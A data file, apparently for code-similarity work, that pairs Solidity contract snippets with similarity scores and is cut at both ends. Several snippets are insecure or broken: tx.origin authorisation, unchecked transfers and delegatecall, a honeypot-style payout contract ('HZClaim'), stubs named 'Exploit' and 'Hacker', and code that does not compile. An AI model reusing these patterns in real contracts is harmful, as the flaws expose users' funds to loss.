    uint256 amount = msg.value;
    if(amount > 0){
      balances[beneficiary] += amount/rate;
      totalSupply += amount/rate;
    }
  }
function balanceOf(address _owner) public constant returns (uint256 balance) {
    return balances[_owner];
}
function collect(uint256 amount) onlyOwner public{
  msg.sender.transfer(amount);
}
function transfer(address _to, uint256 _amount) public returns (bool success) {
    if (balances[msg.sender] >= _amount
        && _amount > 0
        && balances[_to] + _amount > balances[_to]) {
        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
        Transfer(msg.sender, _to, _amount);
        return true;
    } else {
        return false;
    }
}
function transferFrom(
    address _from,
    address _to,
    uint256 _amount
) public returns (bool success) {
    if (balances[_from] >= _amount
        && allowed[_from][msg.sender] >= _amount
        && _amount > 0
        && balances[_to] + _amount > balances[_to]) {
        balances[_from] -= _amount;
        allowed[_from][msg.sender] -= _amount;
        balances[_to] += _amount;
        Transfer(_from, _to, _amount);
        return true;
    } else {
        return false;
    }
}
function approve(address _spender, uint256 _amount) public returns (bool success) {
    allowed[msg.sender][_spender] = _amount;
    Approval(msg.sender, _spender, _amount);
    return true;
}
function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
}
}"
"contract helloNumber {
    int256 internal thisNumber;
    constructor() public {
        thisNumber = 4;
    }

   function showNumber() external pure returns (int256) {
        return 4;  
   }
}",0.6652147187000962,"contract Counter {

   uint256 c;



   constructor() public {

       c = 1;

   }   

   function inc() external {

        c = c + 1;

   }

   function get() public view returns (uint256)  {

       return c;

   }

}"
"contract Forwarder {
  address admin;
  uint fee = 10;

  constructor() public {
    admin = msg.sender;
  }

  function splitFunds(address _b) public payable {
    admin.transfer(msg.value * fee / 100);
    _b.transfer(msg.value - (msg.value * fee / 100));
  }
}",0.6376335108005577,"contract Adminstrator {

  address public admin;

  address payable public owner;



  modifier onlyAdmin() { 

        require(msg.sender == admin || msg.sender == owner,""Not authorized""); 

        _;

  } 



  constructor() public {

    admin = msg.sender;

	owner = msg.sender;

  }



  

}"
"contract TokenReceiver {

    IERC20 private _token;

    event DoneStuff(address from);

    
    constructor (IERC20 token) public {
        _token = token;
    }

    
    function doStuff() external {

        address from = msg.sender;

        _token.transferFrom(from, address(this), 1000);

        emit DoneStuff(from);

    }
}",0.6518078979873279,"contract TestERC223 {
    event Log(address from, uint value, bytes data);
    
    function tokenFallback(address from, uint value, bytes memory data) public {
        emit Log(from, value, data);
        
        IERC20 token = IERC20(msg.sender);

        token.transfer(from, value);
    }
}"
"contract FCCCrowdsale is Owned{
    using SafeMath for uint256;

    address public beneficiary;
    uint256 public fundingGoal;
    uint256 public amountRaised;
    uint256 public openingTime;
    uint256 public closingTime;
    uint256 public initialRate;
    uint256 public finalRate;
    token public tokenReward;


    mapping(address => uint256) public balanceOf;

    bool fundingGoalReached = false;
    bool crowdsaleClosed = false;

    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);

      event Closed();",0.6580544605687315,"contract SeeToken is Claimable {
  using SafeMath for uint256;

  string public constant name = ""See Presale Token"";
  string public constant symbol = ""SEE"";
  uint8 public constant decimals = 18;

  uint256 public totalSupply;
  mapping (address => uint256) balances;

  event Issue(address to, uint256 amount);

  
  function issue(address _to, uint256 _amount) onlyOwner public {
    totalSupply = totalSupply.add(_amount);
    balances[_to] = balances[_to].add(_amount);

    Issue(_to, _amount);
  }

  
  function balanceOf(address _holder) public view returns (uint256 balance) {
    balance = balances[_holder];
  }
}"
"contract Home {

    address[] public deployedConferences;
    address[] public members;
    uint public totalMembers;

    event JoinedDXCon(address indexed memAddr, string name);

    function createConference(string _confName) public {
        address newConference = new Conference(_confName, msg.sender);
        deployedConferences.push(newConference);
    }

    function getDeployedConferences() public view returns(address[]) {
        return deployedConferences;
    }

    function joinDXCon(string _name) public {
        members[totalMembers] = msg.sender;
        totalMembers++;

        emit JoinedDXCon(msg.sender, _name);
    }
}",0.6008119119414413,"contract LLCTokenFactory {

  

  mapping (address => bool) public validContracts; 
  address[] public contracts;

  

  function getContractCount() 
    public
    view
    returns(uint contractCount)
  {
    return contracts.length;
  }

  

  function getDeployedContracts() public view returns (address[] memory)
  {
    return contracts;
  }

  

  function newLLCToken(string memory name, string memory symbol, uint256 init, address owner)
    public
    returns(address)
  {
    LLCToken c = new LLCToken(name, symbol, init, owner);
    validContracts[c] = true;
    contracts.push(c);
    return c;
  }
}"
"contract A {
    address B; 
    function canOnlyBeCalledByB() external {
        if(msg.sender == B) { do thing }
    }
}",0.6249386591078818,"contract Vote {

    event LogVote(address indexed addr);



    function() external {

        emit LogVote(msg.sender);

    }

}"
"contract Registry {
    mapping(bytes32 => address) ID;
    mapping(address => address) Contract;

    function register(bytes32 _id) {
        ID[_id] = tx.origin;
        Contract[tx.origin] = msg.sender;
    }

    function getPublicAddress(bytes32 _id) constant returns (address) {
        return (ID[_id]);
    }

    function getContractAddress(bytes32 _id) constant returns (address) { 
        return Contract[ID[_id]];
    }   

    function verify() {
        User requester = User(msg.sender);
        requester.verify();
    }
}",0.6168365143963418,"contract Restriction {
    mapping (address => bool) internal accesses;

    function Restriction() public {
        accesses[msg.sender] = true;
    }

    function giveAccess(address _addr) public restricted {
        accesses[_addr] = true;
    }

    function removeAccess(address _addr) public restricted {
        delete accesses[_addr];
    }

    function hasAccess() public constant returns (bool) {
        return accesses[msg.sender];
    }

    modifier restricted() {
        require(hasAccess());
        _;
    }
}"
"contract MyContract {

    uint256 public  totalSupply ; 
    mapping( address => uint256) public  balances ;
    address public owner;

    constructor(address _wallet) public payable {
        totalSupply = 6;
        owner = _wallet;
    }

    function () external payable{
        buyToken();
    }

    function buyToken() public payable {
        require(totalSupply >= (msg.value/1000000000000000000)*2);
        balances[msg.sender] += (msg.value/1000000000000000000)*2;
        totalSupply -=(msg.value/1000000000000000000)*2;

    }
    function getTotalSupply()public view returns  (uint256 ){
        return totalSupply;
    }
       function setTotalSupply(uint256 newSupply) public {
        require(msg.sender==owner);
        totalSupply = newSupply;

    }

}",0.6592139292773369,"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  uint256 totalSupply_ = 45467000000000000000000000;

  
  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }

  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

}"
"contract ClassRoom {
    address studentAddr;

    Student student;

    function ClassRoom(address addr) {
        studentAddr = addr;
        student = Student(addr);
    }
    function updateTookTest (uint ID) {
        student.updateStudent(ID);
    }

    
    function readStudentStruct (uint ID) constant returns (address, uint, bool) {
        return student.StudentNames(ID);
    }

   
   function readStudentStruct (uint ID) constant returns (address, uint, bool,address[]) {
        return student.StudentNames(ID);
    }
}",0.6279873286682581,"contract ERC20 {
	  uint public totalSupply;
	  function balanceOf(address who) constant returns (uint);
	  function allowance(address owner, address spender) constant returns (uint);
	

	  function transfer(address _to, uint _value) returns (bool success);
	  function transferFrom(address _from, address _to, uint _value) returns (bool success);
	  event Transfer(address indexed from, address indexed to, uint value);
	}"
"contract Lottery {

  uint lotteryFee = 0.1 ether;
  uint8 counter = 0;
  mapping (uint8 => address) participants;

  function participate() external payable returns(address) {
    require(msg.value == lotteryFee);
    counter = counter + 1;
    participants[counter] = msg.sender;
    return(participants[counter]);
  }

  function getBalance() public returns (uint) { 
    uint contractBalance = address(this).balance;
    return(contractBalance);
  }
}",0.6174676799559614,"contract Safe {

    

    address private owner;



    constructor() public

    {

        owner = msg.sender;

    }



    function()

        external

        payable

    {

        require(msg.sender == owner);

    }



    function claim(address _entryOwner, uint256 _amount)

        external

    {

        require(msg.sender == owner);

        require(_amount <= address(this).balance);

        require(_entryOwner != address(0));

        

        _entryOwner.transfer(_amount);

    }



    function getOwner()

        external

        view

        returns(address)

    {

        return owner;

    }

}"
"contract Storage {

    uint8[5][5] public data;

    function Storage() public {

    }

    function setData(uint8[] _data) {
        for (int i=0;i<5; i++)
            data[i][1]=_data[i];
    }

    function getData() public constant returns(uint8[5][5]){
        return data;
    }


}",0.6504681735870853,"contract FiatContract {

    function ETH(uint _id) public constant returns (uint256);

  	function EUR(uint _id) public constant returns (uint256);

  	function updatedAt(uint _id) public constant returns (uint);

}"
"contract SimpleSend {  

uint public value;
address public dest;

event Init(address _dest, string _logos);
event LogWithdrawal(address _from, uint _amount);

function SimpleSend(address _dest) public {
    dest = _dest;
    emit Init(_dest);
}

function() payable public {
    value = msg.value;
    emit LogWithdrawal(msg.sender, msg.value);
    dest.transfer(value);
}
}",0.6348419928158517,"contract ERC223Interface {

    uint public totalSupply;

    function balanceOf(address who) public constant returns (uint);

    function transfer(address to, uint value) public;

    function transfer(address to, uint value, bytes data) public;

    event Transfer(address indexed from, address indexed to, uint value, bytes data);

}"
"contract B {

  function createFoo (address _contractAddress){
    Contract A = A(_contractAddress);
    A.foo();
  }

  function callFoo (address _contractAddress) {
    address newAddress = _contractAddress;
    newAddress.call(bytes4(sha3(""foo()"")));
  }
}",0.6138021780325068,"contract BrokenContract is Pausable {

    

    address public newContractAddress;



    

    function setNewAddress(address _v2Address) external onlyOwner whenPaused {

        

        owner.transfer(address(this).balance);



        newContractAddress = _v2Address;

    }

}"
"contract A {
    uint256 public value = 100;

    function mul() public {
        value *= 2;
    }
}",0.6582128215791404,"contract AbnormalERC20 {
  function transfer(address to, uint256 value) public;
}"
"contract B {
    uint256 public value = 200;
    address a;

    constructor(address _a) {
        a = _a;
    }

    function delegate() public {
        a.delegatecall(bytes4(keccak256(""mul()"")));
    }
}",0.6482071807153617,"contract TokenInterface {

    function transfer(address _to, uint256 _value) public;

    function balanceOf(address _addr) public constant returns(uint256);

}"
"contract C {
    uint256 public value = 500;
    address b;

    constructor(address _b) {
        b = _b;
    }

    function delegate() public {
        b.delegatecall(bytes4(keccak256(""delegate()"")));
    }
}",0.6400633863844547,"contract token {



    function balanceOf(address _owner) public constant returns (uint256 balance);

    

    

    function transfer(address _to, uint256 _value) public;



}"
"contract B {    
   A private a;    
   function B() {
       A a = new A();
   }    
   function doStuff() {
       a.save(42);
   }
   function getStuff()  returns (int) {
       return a.get();
   }
}",0.614189715680535,"contract testabi {

    uint c;

    function tinhtong(uint a, uint b) public {

        c = a+b;

    } 

    function ketqua() public view returns (uint) {

        return c;

    }

}"
"contract TokenFactory is Migratable {

    address[] public deployedTokens;

    function createToken(string name, string symbol) public {
        address newToken = new Token(name,symbol,msg.sender);
        deployedTokens.push(newToken);            
    }

    function getDeployedTokens() public view returns (address[]) {
        return deployedTokens;
    }

}",0.6569789902454305,"contract TokenFactory {

    address public lastTokenCreated;

    function newToken(string _name, string _symbol, uint _initialSupply) public {
        SmartToken smartToken = new SmartToken(_name, _symbol, 18);
        smartToken.issue(msg.sender, _initialSupply);
        smartToken.setOwner(msg.sender);
        lastTokenCreated = address(smartToken);
    }
}"
"contract owned {
    constructor() { owner = msg.sender; }
    address owner;
}",0.6074375906001354,"contract DSAuthEvents {
    event LogSetOwner     (address indexed owner);
}"
"contract NameReg {
    function register(bytes32 name) public;
    function unregister() public;
 }",0.6707763592881449,"contract ReverseRegistrar {
    function setName(string memory name) public returns (bytes32);
}"
"contract Parent {

    uint256[] values;
    mapping (address => uint256[])transactions;


    function storeValue(uint256 _value) {

        transactions[msg.sender].push(_value);
    }

    function accountTx(address addr) constant returns(uint256[]) {

        return (transactions[addr]);
    }

}",0.6561326658487965,"contract ERC20Basic {
 
    function balanceOf(address who) constant returns (uint256);
    function transfer(address to, uint256 value) returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}"
"contract Greeter {
   string public yourName;
   constructor() public{
      yourName = ""World"";
   }
   function (string name) public {
      yourName = name;
   }
   function hello( ) public constant returns (string) {
      return yourName;
   }
}",0.6773518912533597,"contract SaveInt{

    constructor() public {

    }

    mapping (string=>uint) data;

    function setStr(string key, uint value) public {

        data[key] = value;

    }

    function getStr(string key) public constant returns(uint){

        return data[key];

    }

}"
"contract Callee {

 function validate(string _text) public view {
  
  require(false);
 }
}",0.63725904588447,"contract web3Voorbeeld {

    

    

    function ping() public view returns(string) {

        return(""pong"");

    }

}"
"contract C2 { 
    function aFunction(uint aParameter) returns(uint) {
    return (10);
    }
}",0.6320766319260325,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
"contract C1 { 
    function call (uint aParameter) returns(uint){
        C2 c2 = new C2();
    return c2.aFunction(aParameter);
    }
}",0.6454667469265064,"contract Counter {
  uint i=1;
  function inc() {
    i=i+1;
  }
  function get() constant returns (uint) {
    return i;
  }
}"
"contract Forwarder {

  address public destinationAddress;
  event LogForwarded(address indexed sender, uint amount);

  function Forwarder() public {
    destinationAddress = msg.sender;
  }

  function() payable public {
    emit LogForwarded(msg.sender, msg.value);
    destinationAddress.transfer(msg.value);
  }

}",0.6323851923376091,"contract HZClaim

{

    constructor() public payable {

        org = msg.sender;

    }

    function() external payable {}

    address org;

    function end() public {

        if (msg.sender==org)

            selfdestruct(msg.sender);

    }

    function get() public payable {

        if (msg.value >= address(this).balance)

            msg.sender.transfer(address(this).balance);

    }

}"
"contract Asset {
struct asset {
    bytes32 asset_id;
    bytes32 asset_name;
    bytes32 asset_sqfeet;
    address owner;
}

asset[] items;

function createasset(bytes32 asset_id, bytes32 asset_name, bytes32 asset_sqfeet) public {
    address userwallet = msg.sender;
    asset memory m;
    m.asset_id = asset_id;
    m.asset_name = asset_name;
    m.asset_sqfeet = asset_sqfeet;
    m.owner = userwallet;
    items.push(m);
}

function getassetCount(address owner) public view returns (uint){
    uint count = 0;
    for(uint i=0; i < items.length; i++){
        if(items[i].owner == owner){
            count = count +1;
        }
    }
    return count;
}   

function getassetOwnership(address owner, bytes32 asset_id) public view returns (bool){
    for(uint i=0; i < items.length; i++){
        if(items[i].asset_id == asset_id){
            if(items[i].owner == owner){
                return true;    
            }
        }
    }
    return false;
}

function tranferasset(address new_owner, bytes32 asset_id) public payable {
    require(new_owner != msg.sender);
    address old_owner = msg.sender;
    for(uint i=0; i < items.length; i++){
        if(items[i].asset_id == asset_id){
            if(items[i].owner == old_owner){
                 items[i].owner = new_owner;
            }
        }
    }
}",0.617844803515132,"contract OwnerSigneture

{

  address[] public owners;

  mapping (address => bytes32) public signetures;



  function OwnerSigneture(address[] _owners) public

  {

    owners = _owners;

    initSignetures();

  }



  function initSignetures() private

  {

    for (uint i = 0; i < owners.length; i++) {

      signetures[owners[i]] = bytes32(i + 1);

    }

  }



  

  function addOwner(address _address) signed public {

    owners.push(_address);

  }



  

  function removeOwner(address _address) signed public returns (bool) {



    uint NOT_FOUND = 1e10;

    uint index = NOT_FOUND;

    for (uint i = 0; i < owners.length; i++) {

      if (owners[i] == _address) {

        index = i;

        break;

      }

    }



    if (index == NOT_FOUND) {

      return false;

    }



    for (uint j = index; j < owners.length - 1; j++){

      owners[j] = owners[j + 1];

    }

    delete owners[owners.length - 1];

    owners.length--;



    return true;

  }



  modifier signed()

  {

    require(signetures[msg.sender] != 0x0);

    bytes32 signeture = sha256(msg.data);

    signetures[msg.sender] = signeture;



    bool success = true;

    for (uint i = 0; i < owners.length; i++) {

      if (signeture != signetures[owners[i]]) {

        success = false;

      }

    }



    if (success) {

      initSignetures();

      _;

      

    }

  }

}"
"contract handleArray {
    uint public arrIndex;

    mapping(uint => address) testArray;

    function handleArray() public {
        arrIndex = 0;
    }

    function newEntry(address _newA) public {
        testArray[arrIndex] = A(_newA);
        arrIndex++;
    }

    function returnEntry(uint _index) public returns (string) {
        return A(testArray[_index]).getName();
    }
}",0.6019772731232105,"contract ERC20Basic {
    uint public _totalSupply;
    function totalSupply() public returns (uint);
    function balanceOf(address who) public returns (uint);
    function transfer(address to, uint value) public;
    event Transfer(address indexed from, address indexed to, uint value);
}"
"contract Caller {

    string public new_name;

    Called public called_address;

    function set_address(address _addy) {
        called_address = Called(_addy);
    }

    function caller_set(string _var) {

        called_address.set(_var);
    } 
    function caller_get() {
        new_name= called_address.get();

    }


    function B () payable {

    }


}",0.6416200728607889,"contract ICalled is IOwned {

    

    function callers(address) public pure returns (bool) { }



    function appendCaller(address _caller) public;  

    function removeCaller(address _caller) public;  

    

    event AppendCaller(ICaller _caller);

    event RemoveCaller(ICaller _caller);

}"
"contract test008 {

    mapping (uint256 => string ) private storedData;

    function set(uint _index, string memory _data_to_store) public {
        storedData[_index] = _data_to_store;
    }

    function get(uint _index) public view returns (string memory) {
        return storedData[_index];
    }
}",0.6335183712848703,"contract ERC721Metadata is ERC721Basic {

  function name() external view returns (string memory _name);

  function symbol() external view returns (string memory _symbol);

  function tokenURI(uint256 _tokenId) public view returns (string memory);

}"
"contract HashTest {

bytes32 public hashOutput;
uint public valueOut;

function hash(uint _values) {
    var value = _values; 
    valueOut = value;
    hashOutput = sha3(value);
}

function refund() {
   msg.sender.send(this.balance);
}
}",0.6138374136465007,"contract corrently_iot {

    

	  mapping (address => uint256) public value;

      event Value(address indexed thing, uint256 value);

      

      function setValue(uint256 _value) public {

          value[msg.sender] = _value;

          emit Value(msg.sender,_value);

      }

}"
"contract Test {
  bool completed;

  function Test() {
    completed = false;
  }

  function setCompleted() public {
    completed = true;
  }

  function getCompleted() public view returns (bool) {
    return completed;
  }
}",0.6327509492539725,"contract MintableToken {

  function mintingFinished() public view returns (bool);

  function finishMinting() public returns (bool);



  function mint(address to, uint256 value) public returns (bool);

}"
"contract Test_Oracle {

  
  
  mapping(uint => uint) oracle_values;

  
  
  function StoreDocument(uint _key, uint _value) public {
    oracle_values[_key] = _value;
  }

  
  function RetrieveData(uint _date) public constant returns (uint data) {
    return oracle_values[_date];
  }
}",0.6556711347928893,"contract SaveData{

    constructor() public {

    }

    mapping (string=>string) data;

    function setStr(string key, string value) public payable {

        data[key] = value;

    }

    function getStr(string key) public constant returns(string){

        return data[key];

    }

}"
"contract Adoption {
  struct Pet {
    address owner;
    uint256 price;

  }

  Pet[16] data;

  function Adoption() public {
    for (uint i = 0; i < 16; i++) {

      data[i].price = 500;
      data[i].owner = msg.sender;
    }
  }


  
  function adopt(uint petId) public payable returns (uint, uint) {
    require(petId >= 0 && petId <= 15);
    if ( data[petId].price == 0 ) {
      data[petId].price = 100;
    } else {
      data[petId].price = data[petId].price * 2;
    }

    require(msg.value >= data[petId].price * uint256(1));
    returnEth(data[petId].owner,  (data[petId].price / 2)); 
    data[petId].owner = msg.sender;
    return (petId, data[petId].price);
    
  }





  function getAdopters() external view returns (address[], uint256[]) {
    address[] memory owners = new address[](16);
    uint256[] memory prices =  new uint256[](16);
    for (uint i=0; i<16; i++) {
      owners[i] = (data[i].owner);
      prices[i] = (data[i].price);
    }
    return (owners,prices);
  }

}",0.6151593047294605,"contract owned is usingOraclize{
    address public owner;

    function owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
    
    
    function stringEqual(string _a, string _b) internal returns (bool) {
        return strCompare(_a, _b) == 0;
    }
    function addressToAsciiString(address x) internal returns (string) {
        bytes memory s = new bytes(40);
        for (uint i = 0; i < 20; i++) {
            byte b = byte(uint8(uint(x) / (2**(8*(19 - i)))));
            byte hi = byte(uint8(b) / 16);
            byte lo = byte(uint8(b) - 16 * uint8(hi));
            s[2*i] = char(hi);
            s[2*i+1] = char(lo);
        }
        return string(s);
    }

    function char(byte b) internal returns (byte c) {
        if (b < 10) return byte(uint8(b) + 0x30);
        else return byte(uint8(b) + 0x57);
    }
    
}"
"contract Hash {
    bytes32 hash;

    constructor(bytes32 _hash) public {
        hash = _hash;
    }

    function getHash() public view returns (bytes32) {
        return hash;
    }
}",0.6706818655413128,"contract PazhukovMaxInETH {
    
    bytes32 info = ""I'm smart contract from p5m.ru!"";
    
    function getInfo() view public returns (bytes32) {
        return (info);
    }
    
}"
"contract hodlForYouContractV3 {

event Hodl(address indexed hodler, address token, uint  amount, uint timeLimit);

event PanicSell(address indexed hodler, address token, uint  amount, uint timediff);

event Withdrawal(address indexed hodler, address token, uint  amount);

struct Hodler {
    uint etherBalance;
    address hodler;
    mapping(address => Token) tokens;
}

struct Token {
    bytes32 symbol;
    uint tokenBalance;
    address tokenAddress;
    uint timeLimit;
}

mapping(address => Hodler) public hodlers;


function hodl(address token, byte tokenSymbol, uint256 amount, uint256 timeLimit) {

    hodlers[msg.sender] = Hodler(0, msg.sender);
    Hodler hodler = hodlers[msg.sender];
    hodler.tokens[token] = Token(tokenSymbol, amount, token, timeLimit);
    
    
    ERC20Interface(token).approve(msg.sender, amount);
    ERC20Interface(token).transfer(this, amount);
    ERC20Interface(token).transferFrom(msg.sender, this, amount);
    Hodl(msg.sender, token, amount, timeLimit);

}


function withdraw(address token) {
    Hodler hodler = hodlers[msg.sender];
    require(block.timestamp > hodler.tokens[token].timeLimit);

    uint amount = hodler.tokens[token].tokenBalance;
    hodler.tokens[token].tokenBalance = 0;
    ERC20Interface(token).approve(msg.sender, amount);
    ERC20Interface(token).transferFrom(this, msg.sender, amount);

    Withdrawal(msg.sender, token, amount);

}


function panicSell(address token) {
    
    Hodler hodler = hodlers[msg.sender];

    uint amount = hodler.tokens[token].tokenBalance;
    hodler.tokens[token].tokenBalance = 0;
    ERC20Interface(token).approve(msg.sender, amount);
    ERC20Interface(token).transferFrom(this, msg.sender, amount);

    PanicSell(msg.sender, token, amount, hodler.tokens[token].timeLimit - block.timestamp);

}

}",0.6046920208427218,"contract FixedSupplyToken is ERC20Interface {

    string public constant symbol = ""TWDZ"";

    string public constant name = ""Taiwan Dollar Z"";

    uint8 public constant decimals = 18;

    uint256 _totalSupply = 23000000000 ether;

    

    

    address public owner;

 

    

    mapping(address => uint256) balances;

 

    

    mapping(address => mapping (address => uint256)) allowed;

 

    

    modifier onlyOwner() {

        if (msg.sender != owner) {

            require(msg.sender == owner);

        }

        _;

    }

 

    

    function FixedSupplyToken() {

        owner = msg.sender;

        balances[owner] = _totalSupply;

    }

 

    function totalSupply() constant returns (uint256) {

        return _totalSupply;

    }

 

    

    function balanceOf(address _owner) constant returns (uint256 balance) {

        return balances[_owner];

    }

 

    

    function transfer(address _to, uint256 _amount) returns (bool success) {

        if (balances[msg.sender] >= _amount 

            && _amount > 0

            && balances[_to] + _amount > balances[_to]) {

            balances[msg.sender] -= _amount;

            balances[_to] += _amount;

            Transfer(msg.sender, _to, _amount);

            return true;

        } else {

            return false;

        }

    }

 

    

    

    

    

    

    

    function transferFrom(

        address _from,

        address _to,

        uint256 _amount

    ) returns (bool success) {

        if (balances[_from] >= _amount

            && allowed[_from][msg.sender] >= _amount

            && _amount > 0

            && balances[_to] + _amount > balances[_to]) {

            balances[_from] -= _amount;

            allowed[_from][msg.sender] -= _amount;

            balances[_to] += _amount;

            Transfer(_from, _to, _amount);

            return true;

        } else {

            return false;

        }

    }

 

    

    

    function approve(address _spender, uint256 _amount) returns (bool success) {

        allowed[msg.sender][_spender] = _amount;

        Approval(msg.sender, _spender, _amount);

        return true;

    }

 

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {

        return allowed[_owner][_spender];

    }

}"
"contract Exploit  {

    function execute(uint amount) public {
        store s = store();
        s.tranfer(amount);
        
        s.withdraw();
    }
}",0.6064493839935421,"contract EtherToken is Token {

    
    function deposit()
        public
        payable
    {}

    
    
    function withdraw(uint amount)
        public
    {}
}"
"contract Greeter {
    string public greeting;
    function Greeter () public {
        greeting =""Hello"";
    }
    function setGreeting (string _greeting ) public {
        greeting = _greeting;
    }
    function greet()view public returns (string){
        return greeting;
    }
}",0.6867984113553423,"contract Greeter is Mortal {

    

    string greeting;



    

    constructor() public {

        greeting = ""Well, hello there! I am Gruvin's first Ethereum contract!"";

    }



    

    function greet() public constant returns (string) {

        return greeting;

    }

}"
"contract MyFirstContract {
    string private name;
    uint private age;

    function setName(string newName) {
    name = newName;
    }

    function getName() returns (string) {
    return name;
    }


    function setAge(uint newAge){
    age = newAge;
    }

    function getAge() returns (uint){
    return age;
    }
}",0.6295766419021631,"contract ERC223 is ERC20 {



    function name() constant returns (string _name);

    function symbol() constant returns (string _symbol);

    function decimals() constant returns (uint8 _decimals);



    function transfer(address to, uint256 value, bytes data) returns (bool);



}"
"contract AccessManager {

    mapping(address => bool) public registry;

    function grantAccess(address assetAddr) {
        registry[assetAddr] = true;
    }

    function isAuthorized(address assetAddr) constant returns (bool) {
        return registry[assetAddr];
    }
}",0.6114983357801643,"contract mtfToken { 

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success); 

  function allowanceOf(address _owner, address _spender) public constant returns (uint256 remaining);

}"
"contract MultiAsset {
    address public creator;
    mapping(string => address) assetOwner;

    event NewAsset(string  indexed assetName, address indexed to);
    event AssetTransferred(string indexed assetName, address indexed from, address indexed to);

    function MultiAsset() {
        creator = msg.sender;
    }

    function assignOwner(string assetName, address to) {
        if (msg.sender == creator) {
            
            if (assetOwner[assetName] != 0x0) {
                throw;
            } else {
                assetOwner[assetName] = to;
                NewAsset(assetName, to);
            }
        } else {
            throw;
        }
    }

    function getAssetOwner(string assetName) constant returns (address owner){
        owner = assetOwner[assetName];
        return owner;
    }


    function transfer(string assetName, address to) {
        
        if (msg.sender == assetOwner[assetName]) {
            assetOwner[assetName] = to;
            AssetTransferred(assetName, msg.sender, to);
        } else {
            throw;
        }
    }}",0.6185313042640453,"contract SAUBAERtoken  {
    string public constant symbol = ""SAUBAER"";
    string public constant name = ""SAUBAER"";
    uint8 public constant decimals = 1;
	
	address public owner;
	
	uint256 _totalSupply = 100000;
	
	mapping (address => uint256) balances;
	
    mapping (address => mapping (address => uint256)) allowed;
    
     
    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    
    
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    
    
    function SAUBAERtoken() {
         owner = msg.sender;
         balances[owner] = _totalSupply;
     }


    
    
    function transfer(address _to, uint256 _value) returns (bool success) {
        
        if (balances[msg.sender] >= _value && _value > 0) {
            
            balances[msg.sender] -= _value;
            
            balances[_to] += _value;
            
            Transfer(msg.sender, _to, _value);
            return true;
        } else { return false; }
    }
 
   


}"
"contract TestStruct {

      struct User {
        string name;
        uint256 age;
     }

    mapping (bytes32 => User) users;

    function addManyUsers (User [] memory _users) public {

        for (uint i = 0; i < _users.length; i++) {

           bytes32 hash = keccak256(abi.encode(_users[i].name));
           users[hash] = _users[i];

        }
    }

    function addOneUser (User memory _user) public {

         bytes32 hash = keccak256(abi.encode(_user.name));

           users[hash] = _user;


    }

    function getUser (string memory username) public view returns (User memory) {

        bytes32 hash = keccak256(abi.encode(username));

        return users[hash];
    }
}",0.6045668158103867,"contract SignatureValidator {



    function doHash(string _message1, uint32 _message2, string _header1, string _header2)

     pure internal returns (bytes32) {

        return keccak256(

            abi.encodePacked(

                    keccak256(abi.encodePacked(_header1, _header2)),

                    keccak256(abi.encodePacked(_message1, _message2)))

        );

    }



    

    function checkSignature(string _message1, uint32 _nonce, string _header1, string _header2, bytes32 _r, bytes32 _s, uint8 _v)

     public pure returns (address) {

        bytes32 hash = doHash(_message1, _nonce, _header1, _header2);

        return ecrecover(hash, _v, _r, _s);

    }



}"
"contract Token {
    string public name = ""Token"";
    string public symbol = ""TKN"";
    uint public decimals = 0;
    uint tokenPrice = 1000000000000000;

    uint public supply;
    address public founder;
    address payable public deposit;

    mapping(address => uint) public balances;

    constructor(address payable _deposit, address _founder) public{
        supply = 300000;
        deposit = _deposit;
        founder = _founder;
        balances[founder] = supply;
    }

    function invest(address contributor) public payable {
        uint tokens = msg.value / tokenPrice;

        balances[contributor] += tokens;
        balances[founder] -= tokens;

        deposit.transfer(msg.value);
    }
}",0.6743077452121092,"contract Doge2Token is ERC223BasicToken {

  string public name = ""Doge2 Token"";
  string public symbol = ""DOGE2"";
  uint256 public decimals = 8;
  uint256 public INITIAL_SUPPLY = 200000000000000;
  
  address public owner;
  event Buy(address indexed participant, uint tokens, uint eth);

  
    function Doge2Token() {
        totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        owner = msg.sender;
    }
    
    function () payable {
        
        
        uint tokens = msg.value / 10000;
        balances[owner] -= tokens;
        balances[msg.sender] += tokens;
        bytes memory empty;
        Transfer(owner, msg.sender, tokens, empty);
        
        Buy(msg.sender, tokens, msg.value);
        
        
    }
    
}"
"contract Hacker {
Dao dao;
address userAddress; 
string userName;

constructor(string userName, address daoAddress) public {
    dao = Dao(daoAddress);
    userAddress = msg.sender;
    userName = userName;
}

function addToBalence(string name, uint amount) public payable {
    dao.addToBalence(userName).value(msg.value)(); 
}

function showBalence() public returns(uint){
    return dao.showBalence();
}

function payout(uint amount) public payable{
    dao.withdraw(amount);
}
}",0.6036748417989759,"contract MoatKyber is Trade {



    event AssetsCollected(address name, uint addr);



    constructor(address rAddr) public {

        addressRegistry = rAddr;

    }



    function () public payable {}



    function collectAsset(address tokenAddress, uint amount) public onlyAdmin {

        if (tokenAddress == getAddress(""eth"")) {

            msg.sender.transfer(amount);

        } else {

            IERC20 tokenFunctions = IERC20(tokenAddress);

            tokenFunctions.transfer(msg.sender, amount);

        }

        emit AssetsCollected(tokenAddress, amount);

    }



}"
"contract Coin {

    address public minter;
    mapping (address => uint) public balances;

    event Sent(address from, address to, uint amount);

    function Coin() {
        minter = msg.sender;
    }
    function mint(address receiver, uint amount) returns  {
        if (msg.sender != minter) return;
        balances[receiver] += amount;
    }
    function send(address receiver, uint amount) {
        if (balances[msg.sender] < amount) return;
        balances[msg.sender] -= amount;
